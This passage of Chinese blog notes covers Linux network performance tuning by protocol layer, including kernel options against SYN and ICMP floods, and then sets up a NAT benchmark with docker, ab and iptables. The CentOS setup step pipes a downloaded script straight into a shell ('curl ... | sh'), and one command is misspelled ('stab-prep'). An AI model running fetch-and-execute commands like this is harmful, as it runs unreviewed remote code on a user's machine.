。这样就可以支持更多连接，提高整体的并发能力。</p></li><li><p>增加最大文件描述符的数量。你可以使用 fs.nr_open 和 fs.file-max ，分别增大进程和系统的最大文件描述符数；或在应用程序的 systemd 配置文件中，配置 LimitNOFILE ，设置应用程序的最大文件描述符数。</p></li></ul><p>第二类，为了缓解 SYN FLOOD 等，利用 TCP 协议特点进行攻击而引发的性能问题，你可以考虑优化与 SYN 状态相关的内核选项，比如采取下面几种措施。</p><ul><li><p>增大 TCP 半连接的最大数量 net.ipv4.tcp_max_syn_backlog ，或者开启 TCP SYN Cookies net.ipv4.tcp_syncookies ，来绕开半连接数量限制的问题（注意，这两个选项不可同时使用）。</p></li><li><p>减少 SYN_RECV 状态的连接重传 SYN+ACK 包的次数 net.ipv4.tcp_synack_retries。</p></li></ul><p>第三类，在长连接的场景中，通常使用 Keepalive 来检测 TCP 连接的状态，以便对端连接断开后，可以自动回收。但是，系统默认的 Keepalive 探测间隔和重试次数，一般都无法满足应用程序的性能要求。所以，这时候需要优化与 Keepalive 相关的内核选项，比如：</p><ul><li><p>缩短最后一次数据包到 Keepalive 探测包的间隔时间 net.ipv4.tcp_keepalive_time；</p></li><li><p>缩短发送 Keepalive 探测包的间隔时间 net.ipv4.tcp_keepalive_intvl；</p></li><li><p>减少Keepalive 探测失败后，一直到通知应用程序前的重试次数 net.ipv4.tcp_keepalive_probes。</p></li></ul><p>整理成表格如下：（数值仅供参考，具体配置还要结合你的实际场景来调整）：</p><p><img src="https://static001.geekbang.org/resource/image/b0/e0/b07ea76a8737ed93395736795ede44e0.png?wh=1664*2147" alt="img"></p><p>优化 TCP 性能时，还要注意，如果同时使用不同优化方法，可能会产生冲突。</p><p>比如，服务器端开启 Nagle 算法，而客户端开启延迟确认机制，就很容易导致网络延迟增大。</p><p>另外，在使用 NAT 的服务器上，如果开启 net.ipv4.tcp_tw_recycle ，就很容易导致各种连接失败。实际上，由于坑太多，这个选项在内核的 4.1 版本中已经删除了。</p><p>说完TCP，我们再来看 UDP 的优化。</p><p>UDP 提供了面向数据报的网络协议，它不需要网络连接，也不提供可靠性保障。所以，UDP 优化，相对于 TCP 来说，要简单得多。</p><p>常见的几种优化方案如下</p><ul><li><p>跟上篇套接字部分提到的一样，增大套接字缓冲区大小以及 UDP 缓冲区范围；</p></li><li><p>跟前面 TCP 部分提到的一样，增大本地端口号的范围；</p></li><li><p>根据 MTU 大小，调整 UDP 数据包的大小，减少或者避免分片的发生。</p></li></ul><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>接下来，我们再来看网络层的优化。</p><p>网络层，负责网络包的封装、寻址和路由，包括 IP、ICMP 等常见协议。在网络层，最主要的优化，其实就是对路由、 IP 分片以及 ICMP 等进行调优。</p><p>第一种，从路由和转发的角度出发，你可以调整下面的内核选项。</p><ul><li><p>在需要转发的服务器中，比如用作 NAT 网关的服务器或者使用 Docker 容器时，开启 IP 转发，即设置 net.ipv4.ip_forward &#x3D; 1。</p></li><li><p>调整数据包的生存周期 TTL，比如设置 net.ipv4.ip_default_ttl &#x3D; 64。注意，增大该值会降低系统性能。</p></li><li><p>开启数据包的反向地址校验，比如设置 net.ipv4.conf.eth0.rp_filter &#x3D; 1。这样可以防止 IP 欺骗，并减少伪造 IP 带来的 DDoS 问题。</p></li></ul><p>第二种，从分片的角度出发，最主要的是调整 MTU（Maximum Transmission Unit）的大小。</p><p>通常，MTU 的大小应该根据以太网的标准来设置。以太网标准规定，一个网络帧最大为 1518B，那么去掉以太网头部的 18B 后，剩余的 1500 就是以太网 MTU 的大小。</p><p>在使用 VXLAN、GRE 等叠加网络技术时，要注意，网络叠加会使原来的网络包变大，导致 MTU 也需要调整。</p><p>比如，就以 VXLAN 为例，它在原来报文的基础上，增加了 14B 的以太网头部、 8B 的 VXLAN 头部、8B 的 UDP 头部以及 20B 的 IP 头部。换句话说，每个包比原来增大了 50B。</p><p>所以，我们就需要把交换机、路由器等的 MTU，增大到 1550， 或者把 VXLAN 封包前（比如虚拟化环境中的虚拟网卡）的 MTU 减小为 1450。</p><p>另外，现在很多网络设备都支持巨帧，如果是这种环境，还可以把 MTU 调大为 9000，以提高网络吞吐量。</p><p>第三种，从 ICMP 的角度出发，为了避免 ICMP 主机探测、ICMP Flood 等各种网络问题，可以通过内核选项，来限制 ICMP 的行为。</p><ul><li><p>比如，禁止 ICMP 协议，即设置 net.ipv4.icmp_echo_ignore_all &#x3D; 1。这样，外部主机就无法通过 ICMP 来探测主机。</p></li><li><p>或者，禁止广播 ICMP，即设置 net.ipv4.icmp_echo_ignore_broadcasts &#x3D; 1。</p></li></ul><h3 id="链路层"><a href="#链路层" class="headerlink" title="链路层"></a>链路层</h3><p>网络层的下面是链路层，所以最后，我们再来看链路层的优化方法。</p><p>链路层负责网络包在物理网络中的传输，比如 MAC 寻址、错误侦测以及通过网卡传输网络帧等。自然，链路层的优化，也是围绕这些基本功能进行的。接下来，我们从不同的几个方面分别来看。</p><p>由于网卡收包后调用的中断处理程序（特别是软中断），需要消耗大量的 CPU。所以，将这些中断处理程序调度到不同的 CPU 上执行，就可以显著提高网络吞吐量。这通常可以采用下面两种方法。</p><ul><li><p>为网卡硬中断配置 CPU 亲和性（smp_affinity），或者开启 irqbalance 服务。</p></li><li><p>开启 <strong>RPS</strong>（Receive Packet Steering）和 <strong>RFS</strong>（Receive Flow Steering），将应用程序和软中断的处理，调度到相同CPU 上，这样就可以增加 CPU 缓存命中率，减少网络延迟。</p></li></ul><p>另外，现在的网卡都有很丰富的功能，原来在内核中通过软件处理的功能，可以卸载到网卡中，通过硬件来执行。</p><ul><li><p><strong>TSO</strong>（TCP Segmentation Offload）和 <strong>UFO</strong>（UDP Fragmentation Offload）：在 TCP&#x2F;UDP 协议中直接发送大包；而TCP 包的分段（按照 MSS 分段）和 UDP 的分片（按照 MTU 分片）功能，由网卡来完成 。</p></li><li><p><strong>GSO</strong>（Generic Segmentation Offload）：在网卡不支持 TSO&#x2F;UFO 时，将 TCP&#x2F;UDP 包的分段，延迟到进入网卡前再执行。这样，不仅可以减少 CPU 的消耗，还可以在发生丢包时只重传分段后的包。</p></li><li><p><strong>LRO</strong>（Large Receive Offload）：在接收 TCP 分段包时，由网卡将其组装合并后，再交给上层网络处理。不过要注意，在需要 IP 转发的情况下，不能开启 LRO，因为如果多个包的头部信息不一致，LRO 合并会导致网络包的校验错误。</p></li><li><p><strong>GRO</strong>（Generic Receive Offload）：GRO 修复了 LRO 的缺陷，并且更为通用，同时支持 TCP 和 UDP。</p></li><li><p><strong>RSS</strong>（Receive Side Scaling）：也称为多队列接收，它基于硬件的多个接收队列，来分配网络接收进程，这样可以让多个 CPU 来处理接收到的网络包。</p></li><li><p><strong>VXLAN</strong> 卸载：也就是让网卡来完成 VXLAN 的组包功能。</p></li></ul><p>最后，对于网络接口本身，也有很多方法，可以优化网络的吞吐量。</p><ul><li><p><strong>开启网络接口的多队列功能（todo）。这样，每个队列就可以用不同的中断号，调度到不同 CPU 上执行，从而提升网络的吞吐量。</strong></p></li><li><p>增大网络接口的缓冲区大小，以及队列长度等，提升网络传输的吞吐量（注意，这可能导致延迟增大）。</p></li><li><p>使用 Traffic Control 工具，为不同网络流量配置 QoS。</p></li></ul><p>对于吞吐量要求高的场景，可以用两种方式来优化。</p><p>第一种，使用 DPDK 技术，跳过内核协议栈，直接由用户态进程用轮询的方式，来处理网络请求。同时，再结合大页、CPU 绑定、内存对齐、流水线并发等多种机制，优化网络包的处理效率。</p><p>第二种，使用内核自带的 XDP 技术，在网络包进入内核协议栈前，就对其进行处理，这样也可以实现很好的性能。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>通过这两篇文章，我们梳理了常见的 Linux 网络性能优化方法。</p><p>在优化网络的性能时，我们可以结合 Linux 系统的网络协议栈和网络收发流程，从应用程序、套接字、传输层、网络层再到链路层等，对每个层次进行逐层优化。</p><p>实际上，我们分析和定位网络瓶颈，也是基于这些网络层进行的。而定位出网络性能瓶颈后，我们就可以根据瓶颈所在的协议层，进行优化。具体而言：</p><ul><li><p>在应用程序中，主要是优化 I&#x2F;O 模型、工作模型以及应用层的网络协议；</p></li><li><p>在套接字层中，主要是优化套接字的缓冲区大小；</p></li><li><p>在传输层中，主要是优化 TCP 和 UDP 协议；</p></li><li><p>在网络层中，主要是优化路由、转发、分片以及 ICMP 协议；</p></li><li><p>最后，在链路层中，主要是优化网络包的收发、网络功能卸载以及网卡选项。</p></li></ul><p>如果这些方法依然不能满足要求，那就可以考虑，使用 DPDK 等用户态方式，绕过内核协议栈；或者，使用 XDP，在网络包进入内核协议栈前进行处理。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>笔记</tag>
      
      <tag>linux</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>11.网络性能优化的几个思路（上）</title>
    <link href="/2022/11/15/11-%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%9A%84%E5%87%A0%E4%B8%AA%E6%80%9D%E8%B7%AF%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <url>/2022/11/15/11-%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%9A%84%E5%87%A0%E4%B8%AA%E6%80%9D%E8%B7%AF%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="11-网络性能优化的几个思路（上）"><a href="#11-网络性能优化的几个思路（上）" class="headerlink" title="11.网络性能优化的几个思路（上）"></a>11.网络性能优化的几个思路（上）</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt; 本文笔记来自：「极客时间  Linux 性能优化实战」，原文链接：https:<span class="hljs-regexp">//</span>time.geekbang.org<span class="hljs-regexp">/column/</span>article/<span class="hljs-number">80898</span><br></code></pre></td></tr></table></figure><p>应用层的各种 I&#x2F;O 模型，冗长的网络协议栈和众多的内核选项，抑或是各种复杂的网络环境，都提高了网络的复杂性。</p><p>不过，只要掌握了 Linux 网络的基本原理和常见网络协议的工作流程，再结合各个网络层的性能指标来分析，你会发现，定位网络瓶颈并不难。</p><p>找到网络性能瓶颈后，下一步要做的就是优化了，也就是如何降低网络延迟，并提高网络的吞吐量。接下面我们通过两篇文章分析优化网络性能问题的思路和一些注意事项。</p><h2 id="确定优化目标"><a href="#确定优化目标" class="headerlink" title="确定优化目标"></a>确定优化目标</h2><p>我们观察到的网络性能指标，要达到多少才合适呢？</p><p>实际上，虽然网络性能优化的整体目标，是降低网络延迟（如 RTT）和提高吞吐量（如 BPS 和 PPS），但具体到不同应用中，每个指标的优化标准可能会不同，优先级顺序也大相径庭。</p><p>就拿上一节提到的 NAT 网关来说，由于其直接影响整个数据中心的网络出入性能，所以 NAT 网关通常需要达到或接近线性转发，也就是说， PPS 是最主要的性能目标。</p><p>再如，对于数据库、缓存等系统，快速完成网络收发，即低延迟，是主要的性能目标。</p><p>而对于我们经常访问的 Web 服务来说，则需要同时兼顾<strong>吞吐量和延迟</strong>。</p><p>所以，为了更客观合理地评估优化效果，我们首先应该明确优化的标准，即要对系统和应用程序进行基准测试，得到网络协议栈各层的基准性能。</p><p><img src="https://static001.geekbang.org/resource/image/c7/ac/c7b5b16539f90caabb537362ee7c27ac.png?wh=1092*1316" alt="img"></p><p>基于上图，在进行基准测试时，我们就可以按照协议栈的每一层来测试。由于底层是其上方各层的基础，底层性能也就决定了高层性能。所以我们要清楚，底层性能指标，其实就是对应高层的极限性能。我们从下到上来理解这一点。</p><p>首先是网络接口层和网络层，它们主要负责网络包的封装、寻址、路由，以及发送和接收。每秒可处理的网络包数 PPS，就是它们最重要的性能指标（特别是在小包的情况下）。可以用内核自带的发包工具 pktgen ，来测试 PPS 的性能。</p><p>再向上到传输层的 TCP 和 UDP，它们主要负责网络传输。对它们而言，吞吐量（BPS）、连接数以及延迟，就是最重要的性能指标。我们可以用 iperf 或 netperf ，来测试传输层的性能。</p><p>不过要注意，网络包的大小，会直接影响这些指标的值。所以，通常，需要测试一系列不同大小网络包的性能。</p><p>最后，再往上到了应用层，最需要关注的是吞吐量（BPS）、每秒请求数以及延迟等指标。可以用 wrk、ab 等工具，来测试应用程序的性能。</p><p>不过，这里要注意的是，测试场景要尽量模拟生产环境，这样的测试才更有价值。比如，可以到生产环境中，录制实际的请求情况，再到测试中回放。</p><p>总之，根据这些基准指标，再结合已经观察到的性能瓶颈，我们就可以明确性能优化的目标。</p><h2 id="网络性能工具"><a href="#网络性能工具" class="headerlink" title="网络性能工具"></a>网络性能工具</h2><p><img src="https://static001.geekbang.org/resource/image/a1/3b/a1eb07e281e5795be83c11d7255c543b.png?wh=1714*1944" alt="img"></p><p><img src="https://static001.geekbang.org/resource/image/0d/a0/0d87b39b89a1b7f325fc5477c0182ea0.png?wh=1714*2280" alt="img"></p><h2 id="网络性能优化"><a href="#网络性能优化" class="headerlink" title="网络性能优化"></a>网络性能优化</h2><p>总的来说，先要获得网络基准测试报告，然后通过相关性能工具，定位出网络性能瓶颈。再接下来的优化工作，就是水到渠成的事情了。</p><p>Linux 系统的网络协议栈和网络收发流程如下：</p><p><img src="https://static001.geekbang.org/resource/image/a1/3f/a118911721f9b67ce9c83de15666753f.png?wh=1826*1242" alt="img"></p><p>接下来，我们就可以从应用程序、套接字、传输层、网络层以及链路层等几个角度，分别来看网络性能优化的基本思路。</p><h3 id="应用程序"><a href="#应用程序" class="headerlink" title="应用程序"></a>应用程序</h3><p>应用程序，通常通过套接字接口进行网络操作。由于网络收发通常比较耗时，所以应用程序的优化，主要就是对网络 I&#x2F;O 和进程自身的工作模型的优化。</p><p>从网络 I&#x2F;O 的角度来说，主要有下面两种优化思路。</p><p>第一种是最常用的 I&#x2F;O 多路复用技术 epoll，主要用来取代 select 和 poll。这其实是解决 C10K 问题的关键，也是目前很多网络应用默认使用的机制。</p><p>第二种是使用异步 I&#x2F;O（Asynchronous I&#x2F;O，AIO）。AIO 允许应用程序同时发起很多 I&#x2F;O 操作，而不用等待这些操作完成。等到 I&#x2F;O完成后，系统会用事件通知的方式，告诉应用程序结果。不过，AIO 的使用比较复杂，你需要小心处理很多边缘情况。</p><p>而从进程的工作模型来说，也有两种不同的模型用来优化。</p><p>第一种，主进程+多个 worker 子进程。其中，主进程负责管理网络连接，而子进程负责实际的业务处理。这也是最常用的一种模型。</p><p>第二种，监听到相同端口的多进程模型。在这种模型下，所有进程都会监听相同接口，并且开启 SO_REUSEPORT 选项，由内核负责，把请求负载均衡到这些监听进程中去。</p><p>除了网络 I&#x2F;O 和进程的工作模型外，应用层的网络协议优化，也是至关重要的一点。</p><p>常见的几种优化方法如下：</p><ul><li><p>使用长连接取代短连接，可以显著降低 TCP 建立连接的成本。在每秒请求次数较多时，这样做的效果非常明显。</p></li><li><p>使用内存等方式，来缓存不常变化的数据，可以降低网络 I&#x2F;O 次数，同时加快应用程序的响应速度。</p></li><li><p>使用 Protocol Buffer 等序列化的方式，压缩网络 I&#x2F;O 的数据量，可以提高应用程序的吞吐。</p></li><li><p>使用 DNS 缓存、预取、HTTPDNS 等方式，减少 DNS 解析的延迟，也可以提升网络 I&#x2F;O 的整体速度。</p></li></ul><h3 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h3><p>套接字可以屏蔽掉 Linux 内核中不同协议的差异，为应用程序提供统一的访问接口。每个套接字，都有一个读写缓冲区。</p><ul><li><p>读缓冲区，缓存了远端发过来的数据。如果读缓冲区已满，就不能再接收新的数据。</p></li><li><p>写缓冲区，缓存了要发出去的数据。如果写缓冲区已满，应用程序的写操作就会被阻塞。</p></li></ul><p>所以，为了提高网络的吞吐量，你通常需要调整这些缓冲区的大小。比如：</p><ul><li><p>增大每个套接字的缓冲区大小 net.core.optmem_max；</p></li><li><p>增大套接字接收缓冲区大小 net.core.rmem_max 和发送缓冲区大小 net.core.wmem_max；</p></li><li><p>增大 TCP 接收缓冲区大小 net.ipv4.tcp_rmem 和发送缓冲区大小 net.ipv4.tcp_wmem。</p></li></ul><p>套接字的内核选项如下：</p><p><img src="https://static001.geekbang.org/resource/image/5f/f0/5f2d4957663dd8bf3410da8180ab18f0.png?wh=1696*959" alt="img"></p><p>有几点需要注意。</p><ul><li><p>tcp_rmem 和 tcp_wmem 的三个数值分别是 min，default，max，系统会根据这些设置，自动调整TCP接收&#x2F;发送缓冲区的大小。</p></li><li><p>udp_mem 的三个数值分别是 min，pressure，max，系统会根据这些设置，自动调整UDP发送缓冲区的大小。</p></li></ul><p>表格中的数值只提供参考价值，具体应该设置多少，还需要根据实际的网络状况来确定。比如，发送缓冲区大小，理想数值是吞吐量*延迟，这样才可以达到最大网络利用率。</p><p>除此之外，套接字接口还提供了一些配置选项，用来修改网络连接的行为：</p><ul><li><p>为 TCP 连接设置 TCP_NODELAY 后，就可以禁用 Nagle 算法；</p></li><li><p>为 TCP 连接开启 TCP_CORK 后，可以让小包聚合成大包后再发送（注意会阻塞小包的发送）；</p></li><li><p>使用 SO_SNDBUF 和 SO_RCVBUF ，可以分别调整套接字发送缓冲区和接收缓冲区的大小。</p></li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在优化网络性能时，可以结合 Linux 系统的网络协议栈和网络收发流程，然后从应用程序、套接字、传输层、网络层再到链路层等，进行逐层优化。</p><p>定位出性能瓶颈后，就可以根据瓶颈所在的协议层进行优化。</p><p>这篇文章主要讲解了应用程序和套接字的优化思路：</p><ul><li><p>在应用程序中，主要优化 I&#x2F;O 模型、工作模型以及应用层的网络协议；</p></li><li><p>在套接字层中，主要优化套接字的缓冲区大小。</p></li></ul><p>下篇文章继续讲解其他各个网络层的优化方法。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>笔记</tag>
      
      <tag>linux</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>10.如何优化 NAT 性能？（下）</title>
    <link href="/2022/11/15/10-%E5%A6%82%E4%BD%95%E4%BC%98%E5%8C%96NAT%E6%80%A7%E8%83%BD%EF%BC%9F%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <url>/2022/11/15/10-%E5%A6%82%E4%BD%95%E4%BC%98%E5%8C%96NAT%E6%80%A7%E8%83%BD%EF%BC%9F%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="10-如何优化-NAT-性能？（下）"><a href="#10-如何优化-NAT-性能？（下）" class="headerlink" title="10.如何优化 NAT 性能？（下）"></a>10.如何优化 NAT 性能？（下）</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt; 本文笔记来自：「极客时间  Linux 性能优化实战」，原文链接：https:<span class="hljs-regexp">//</span>time.geekbang.org<span class="hljs-regexp">/column/</span>article/<span class="hljs-number">80898</span><br></code></pre></td></tr></table></figure><p>Linux 中的NAT ，基于内核的连接跟踪模块实现。所以，它维护每个连接状态的同时，也对网络性能有一定影响。那么，碰到 NAT 性能问题时，我们又该怎么办呢？</p><p>接下来，通过一个案例，学习 NAT 性能问题的分析思路。</p><h2 id="案例准备"><a href="#案例准备" class="headerlink" title="案例准备"></a>案例准备</h2><p>下面的案例仍然基于 Ubuntu 18.04，同样适用于其他的 Linux 系统。案例环境如下：</p><ul><li><p>机器配置：2 CPU，8GB 内存。</p></li><li><p>预先安装 docker、tcpdump、curl、ab、SystemTap 等工具，比如</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Ubuntu</span><br><span class="hljs-variable">$</span> apt<span class="hljs-literal">-get</span> install <span class="hljs-literal">-y</span> docker.io tcpdump <span class="hljs-built_in">curl</span> apache2<span class="hljs-literal">-utils</span><br><br><span class="hljs-comment"># CentOS</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-literal">-fsSL</span> https://get.docker.com | sh<br><span class="hljs-variable">$</span> yum install <span class="hljs-literal">-y</span> tcpdump <span class="hljs-built_in">curl</span> httpd<span class="hljs-literal">-tools</span><br><br></code></pre></td></tr></table></figure><p>这里简单介绍一下 SystemTap 。</p><p><a href="https://sourceware.org/systemtap/">SystemTap</a> 是 Linux 的一种动态追踪框架，它把用户提供的脚本，转换为内核模块来执行，用来监测和跟踪内核的行为。安装步骤如下：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs vim"># Ubuntu<br>apt-<span class="hljs-built_in">get</span> install -<span class="hljs-keyword">y</span> systemtap-<span class="hljs-keyword">runtime</span> systemtap<br># Configure ddebs <span class="hljs-keyword">source</span><br><span class="hljs-keyword">echo</span> <span class="hljs-comment">&quot;deb http://ddebs.ubuntu.com $(lsb_release -cs) main restricted universe multiverse</span><br><span class="hljs-keyword">deb</span> http://ddebs.ubuntu.<span class="hljs-keyword">com</span> $(lsb_release -<span class="hljs-keyword">cs</span>)-updates main restricted universe multiverse<br><span class="hljs-keyword">deb</span> http://ddebs.ubuntu.<span class="hljs-keyword">com</span> $(lsb_release -<span class="hljs-keyword">cs</span>)-proposed main restricted universe multiverse<span class="hljs-comment">&quot; | \</span><br>sudo tee -<span class="hljs-keyword">a</span> /etc/apt/sources.<span class="hljs-keyword">list</span>.d/ddebs.<span class="hljs-keyword">list</span><br># Install dbgsym<br>apt-key adv --keyserver keyserver.ubuntu.<span class="hljs-keyword">com</span> --recv-<span class="hljs-built_in">keys</span> F2EDC64DC5AEE1F6B9C621F0C8CAB6595FDFF622<br>apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span><br>apt install ubuntu-dbgsym-keyring<br>stap-prep<br>apt-<span class="hljs-built_in">get</span> install linux-image-`uname -r`-dbgsym<br><br># CentOS<br>yum install systemtap kernel-devel yum-utils kernel<br>stab-prep<br><br></code></pre></td></tr></table></figure><p>本次案例基于 Nginx，并且会用 ab 作为它的客户端，进行压力测试。案例中总共用到两台虚拟机，关系图如下。</p><p><img src="https://static001.geekbang.org/resource/image/70/c6/7081ad1b72535107e94f852ac41e0dc6.png?wh=1632*1032" alt="img"></p><p>接下来，打开两个终端，分别 SSH 登录到两台机器上（以下步骤，假设终端编号与图示VM 编号一致），并安装上面提到的这些工具。注意，curl 和 ab 只需要在客户端 VM（即 VM2）中安装。</p><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><p>为了对比 NAT 带来的性能问题，我们首先运行一个不用 NAT 的 Nginx 服务，并用 ab 测试它的性能。</p><p>在终端一中，执行下面的命令，启动 Nginx，注意选项 –network&#x3D;host ，表示容器使用 Host 网络模式，即不使用 NAT：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ docker <span class="hljs-built_in">run</span> --name nginx-hostnet --privileged <span class="hljs-attribute">--network</span>=host -itd feisky/nginx:80<br><br></code></pre></td></tr></table></figure><p>然后到终端二中，执行 curl 命令，确认 Nginx 正常启动：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">$ curl http://192.168.0.30/<br>...<br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>Thank you for using nginx.<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>继续在终端二中，执行 ab 命令，对 Nginx 进行压力测试。不过在测试前要注意，Linux 默认允许打开的文件描述数比较小，比如在我的机器中，这个值只有 1024：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">open files</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ulimit</span> -n</span><br>1024<br><br></code></pre></td></tr></table></figure><p>所以，执行 ab 前，先要把这个选项调大，比如调成 65536:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">临时增大当前会话的最大文件描述符数</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ulimit</span> -n 65536</span><br><br></code></pre></td></tr></table></figure><p>接下来，再去执行 ab 命令，进行压力测试：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs tap"><span class="hljs-comment"># -c表示并发请求数为5000，-n表示总的请求数为10万</span><br><span class="hljs-comment"># -r表示套接字接收错误时仍然继续执行，-s表示设置每个请求的超时时间为2s</span><br>$ ab -c<span class="hljs-number"> 5000 </span>-n<span class="hljs-number"> 100000 </span>-r -s<span class="hljs-number"> 2 </span>http://192.168.0.30/<br>...<br>Requests per second:    6576.21 [<span class="hljs-comment">#/sec] (mean)</span><br>Time per request:       760.317 [ms] (mean)<br>Time per request:       0.152 [ms] (mean, across all concurrent requests)<br>Transfer rate:          5390.19 [Kbytes/sec] received<br><br>Connection Times (ms)<br>              min  mean[+/-sd] median   max<br>Connect:       <span class="hljs-number"> 0 </span><span class="hljs-number"> 177 </span>714.3     <span class="hljs-number"> 9 </span>   7338<br>Processing:    <span class="hljs-number"> 0 </span> <span class="hljs-number"> 27 </span> 39.8    <span class="hljs-number"> 19 </span>    961<br>Waiting:       <span class="hljs-number"> 0 </span> <span class="hljs-number"> 23 </span> 39.5    <span class="hljs-number"> 16 </span>    951<br>Total:         <span class="hljs-number"> 1 </span><span class="hljs-number"> 204 </span>716.3    <span class="hljs-number"> 28 </span>   7349<br>...<br><br></code></pre></td></tr></table></figure><p>可以看出：</p><ul><li><p>每秒请求数（Requests per second）为 6576；</p></li><li><p>每个请求的平均延迟（Time per request）为 760ms；</p></li><li><p>建立连接的平均延迟（Connect）为 177ms。</p></li></ul><p>记住这几个数值，这将是接下来案例的基准指标。</p><p>接着，回到终端一，停止这个未使用NAT的Nginx应用：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> docker <span class="hljs-built_in">rm</span> <span class="hljs-operator">-f</span> nginx<span class="hljs-literal">-hostnet</span><br><br></code></pre></td></tr></table></figure><p>再执行下面的命令，启动今天的案例应用。案例应用监听在 8080 端口，并且使用了 DNAT ，来实现 Host 的 8080 端口，到容器的 8080 端口的映射关系：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ docker run <span class="hljs-attr">--name</span> nginx <span class="hljs-attr">--privileged</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">8080</span>:<span class="hljs-number">8080</span> -itd feisky/nginx:nat<br><br></code></pre></td></tr></table></figure><p>Nginx 启动后，执行 iptables 命令，确认 DNAT 规则已经创建：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ iptables -nL -t nat<br>Chain PREROUTING (policy ACCEPT)<br>target     prot <span class="hljs-keyword">opt</span> <span class="hljs-keyword">source</span>               destination<br>DOCKER     <span class="hljs-keyword">all</span>  --  <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">0</span>            <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">0</span>            ADDRTYPE <span class="hljs-keyword">match</span> dst-<span class="hljs-built_in">type</span> LOCAL<br><br>...<br><br>Chain DOCKER (<span class="hljs-number">2</span> references)<br>target     prot <span class="hljs-keyword">opt</span> <span 